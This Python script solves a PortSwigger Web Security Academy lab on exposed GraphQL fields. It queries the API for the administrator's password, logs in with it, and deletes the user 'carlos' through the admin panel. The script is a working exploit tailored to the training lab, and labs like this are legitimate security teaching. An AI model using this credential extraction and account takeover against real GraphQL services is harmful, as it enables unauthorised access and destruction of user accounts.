# Accidental exposure of private GraphQL fields

# https://portswigger.net/web-security/graphql/lab-graphql-accidental-field-exposure

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
from bs4 import BeautifulSoup
import argparse


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


##########################################################
#	FUNCTIONS
##########################################################

def get_csrf_token(r):
	soup = BeautifulSoup(r.content, 'html.parser')
	csrf_input = soup.find("input", {'name':'csrf'})
	csrf = csrf_input['value']
	print('[+] Found CSRF Token:\t%s' % csrf)
	return csrf

def get_password(s, url):
	print('\n[+] Trying to retrieve the password of the administrator in the database...')
	api_path = url + '/graphql/v1'
	payload = {"query": "query {\n\tgetUser(id:1) {\n\t\tpassword\n\t\tid\n\t\tusername\n\t}\n}"}
	print(payload)
	r = s.post(api_path, json=payload)
	print(r.text)
	return re.search(rb'"password": "(.*)",\n      "', r.text.encode()).group(1).decode()

def delete_carlos(s, url, password):
	s.cookies.clear()
	api_path = url + '/graphql/v1'
	login_path = url + '/login'
	account_path = url + '/my-account'
	print('\n[+] Trying to grab CSRF Token to log in..')
	r = s.get(login_path)
	csrf_token = get_csrf_token(r)
	time.sleep(1)
	print('\n[+] Trying to connect as Administrator...')
	payload = {"query":"\n    mutation login($input: LoginInput!) {\n        login(input: $input) {\n            token\n            success\n        }\n    }","operationName":"login","variables":{"input":{"username":"administrator","password":f"{password}"}}}
	print(payload)
	r = s.post(api_path, json=payload)
	time.sleep(1)
	print(r.text)
	token = re.search(rb'"token": "(.*)",\n      "', r.text.encode()).group(1).decode()
	cookies = {"session": token}
	r = s.get(account_path, cookies=cookies)
	time.sleep(1)
	if 'Your username is: administrator' in r.text:
		print('[+] Logged in as Administrator !\n')
		admin_panel_path = url + '/admin'
		delete_carlos_path = admin_panel_path + '/delete?username=carlos'
		print('[+] Trying to delete Carlos user...')
		r = s.get(delete_carlos_path, cookies=cookies)
		time.sleep(1)
		if 'User deleted successfully!' in r.text:
			print('[+] Successfully removed Carlos user !')
		else:
			print('[-] Exploit failed to remove Carlos user <!>')
			sys.exit(1)


##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Accidental exposure of private GraphQL fields')
	parser = argparse.ArgumentParser(description="[+] Lab: Accidental exposure of private GraphQL fields")
	parser.add_argument('-U',dest='url',required=True, help="Target URL")
	args = parser.parse_args()
	parsed_url = urllib.parse.urlparse(args.url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			password = get_password(s, url)
			print(password)
			delete_carlos(s, url, password)
		s.cookies.clear()
		time.sleep(2)
		r = s.get(url)
		if 'Congratulations, you solved the lab!' in r.text:
			print('\n[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
